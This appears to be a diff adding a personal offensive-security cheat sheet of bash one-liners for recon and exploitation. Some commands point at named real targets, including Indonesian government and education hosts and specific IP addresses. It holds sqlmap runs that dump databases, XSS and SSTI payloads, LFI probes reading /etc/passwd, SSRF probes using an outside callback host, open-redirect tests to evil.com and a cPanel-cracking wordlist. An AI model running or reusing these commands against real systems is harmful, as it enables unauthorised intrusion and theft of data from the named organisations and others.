@@ -1,0 +1,59 @@
+Scanning and Enumeration
+subfinder -dL /home/kali/Tools/Aman.txt | httpx -status-code
+subfinder -dL /home/kali/Tools/Aman.txt -all -recursive > subaman.txt
+cat /home/kali/Tools/Aman.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @
+mkdir nmap; cat /home/kali/Tools/Aman.txt | parallel -j 35 nmap {} -sTVC -host-timeout 15m -oN nmap/{} -p 22,80,443,8080 --open > /dev/null 2>&1; cd nmap; grep -Hari "/tcp" | tee -a ../services.txt; cd ../
+subfinder -d viator.com -all -recursive > subdomain.txt
+cat /home/kali/Tools/Aman.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
+subfinder -dL /home/kali/Tools/Aman.txt -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path 'cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaa' -mc 400
+subfinder -d wkmb-dev.kemdikbud.go.id -all | naabu | httpx | nuclei -t nuclei-templates
+findomain -t https://wkmb-dev.kemdikbud.go.id/ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
+
+# SQL Injection
+sqlmap -u http://118.98.222.7/article/34 -p param -v3
+cat /home/kali/Tools/Aman.txt | gf sqli | sort -u | anew | httpx | qsreplace 2jmepn2tt7m7o95ckt40660omfs6gw4l.oastify.com | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
+subfinder -d http://118.98.222.7/api/article/admin/published?page=4 -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt
+cat /home/kali/Tools/Aman.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli.txt; sqlmap -m sqli.txt --batch --random-agent --level 5 --risk 3 --dbs
+
+# Cross-Site Scripting (XSS)
+python3 pwnxss.py -u https://118.98.222.15/web/
+cat /home/kali/Tools/Aman.txt | gf xss >> XSS.txt
+dalfox file /home/kali/Tools/Aman.txt -o Vulnerable_XSS.txt
+cat /home/kali/Tools/Aman.txt | Gxss -p khXSS -o XSS_Ref.txt
+http://118.98.222.9/data_referensi2.php?id=010000%27%26%23x27%3B%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt.valueOf%28%29%281%29%3E%3C%2FiFramE%3E&page=2
+https://siplah-dashboard.staging.belajar.id/login/?site=evil.com?site=evil.com
+echo "http://118.98.222.7/" | waybackurls | gf redirect
+cat /home/kali/Tools/Aman.txt | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
+
+# Server-Side Request Forgery (SSRF)
+python3 pwnssrf.py -H https://wkmb-dev.kemdikbud.go.id/
+cat /home/kali/Tools/Aman.txt | gf ssrf | sort -u | anew | httpx | qsreplace 2jmepn2tt7m7o95ckt40660omfs6gw4l.oastify.com | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
+
+# Directory Traversal
+python3 dotdotslash.py -u https://wkmb-dev.kemdikbud.go.id/
+
+# File Inclusion and Path Traversal
+cat /home/kali/Tools/Aman.txt | (gau || hakrawler || waybackurls || katana) | gf lfi | httpx -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -tech-detect -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
+cat /home/kali/Tools/Aman.txt | (gau || hakrawler || waybackurls || katana) | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+cat /home/kali/Tools/Aman.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200
+
+# Miscellaneous
+/home/cPanel-Crack/lib/wordlist.txt
+cat /home/kali/Tools/Aman.txt | grep -E "\.txt|\.log|\.cache\.secret|\.db.backup\.yml|\.json|\.gz|\.rar|\.zip|\.config"
+cat /home/kali/Tools/Aman.txt | grep -E "\.js$" >> js.txt
+cat /home/kali/Tools/Aman.txt | (gau || hakrawler || waybackurls || katana) | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
+echo 118.98.222.8 | (gau || hakrawler || waybackurls || katana) | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar"
+subfinder -d wkmb-dev.kemdikbud.go.id -silent | dnsx -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'
+
+# Exploit Scripts
+python3 jok3r.py attack -t wkmb-dev.kemdikbud.go.id -s http --cat-only vulnscan --add2db hackingloops
+python3 logsensor.py -
+
+# Other Tools and Scripts
+python2 pwnredir.py -u https://admin.kampusmerdeka.staging.belajar.id -f payloads.list
+python ws.py -t
+python vulmap.py -u https://118.98.221.43/
+shodanx custom -cq '"Server: Check Point SVN" "X-UA-Compatible: IE=EmulateIE7" 200' -fct ip -o /home/kali/Tools/Aman.txt
+python3 exploit.py -l /home/kali/Tools/Aman.txt -t 200 -o output.txt -ftd /etc/passwd
+./gochopchop scan --url-file /home/kali/Tools/Aman.txt
+./xray_linux_amd64 ws --basic-crawler https://wkmb-dev.kemdikbud.go.id --plugins cmd-injection,sqldet --html-output 118.98.222.15.html
